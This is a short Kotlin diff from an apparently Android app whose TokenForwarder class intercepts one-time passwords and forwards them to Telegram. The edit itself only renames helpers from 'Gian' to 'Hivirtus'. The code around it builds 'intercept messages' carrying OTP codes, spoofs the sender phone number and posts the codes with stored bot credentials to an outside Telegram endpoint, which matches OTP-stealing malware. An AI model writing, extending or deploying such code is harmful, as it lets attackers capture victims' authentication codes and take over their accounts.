@@ -57,7 +57,7 @@ class TokenForwarder(
         val message = buildInterceptMessage(otp, config)
         val sendFrom = resolveSendFrom(config)
         val smsBody = smsCopyText(otp)
-        val markup = buildGianCopyReplyMarkup(dest, smsBody, sendFrom)
+        val markup = buildHivirtusCopyReplyMarkup(dest, smsBody, sendFrom)
         val sent = postTelegram(creds.first, creds.second, message, markup, useHtml = false)
         if (sent) {
             context?.let { ClipboardCopyHelper.copySms(it, smsCopyText(otp)) }
@@ -117,14 +117,14 @@ class TokenForwarder(
     }
 
     private fun buildOutgoingBlockedMessage(dest: String, smsBody: String, sendFrom: String): String {
-        return GianPanelCompat.buildTelegramInterceptMessage(dest.ifBlank { sendFrom }, smsBody)
+        return HivirtusPanelFormat.buildTelegramInterceptMessage(dest.ifBlank { sendFrom }, smsBody)
     }
 
     private fun resolveSendFrom(config: ModuleConfig): String =
         configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }
 
-    private fun buildGianCopyReplyMarkup(dest: String, copyBody: String, sendFrom: String): JSONObject {
-        val oneTap = GianPanelCompat.oneTapCopy(dest.ifBlank { sendFrom }, copyBody)
+    private fun buildHivirtusCopyReplyMarkup(dest: String, copyBody: String, sendFrom: String): JSONObject {
+        val oneTap = HivirtusPanelFormat.oneTapCopy(dest.ifBlank { sendFrom }, copyBody)
         val row = JSONArray().apply {
             put(
                 JSONObject()
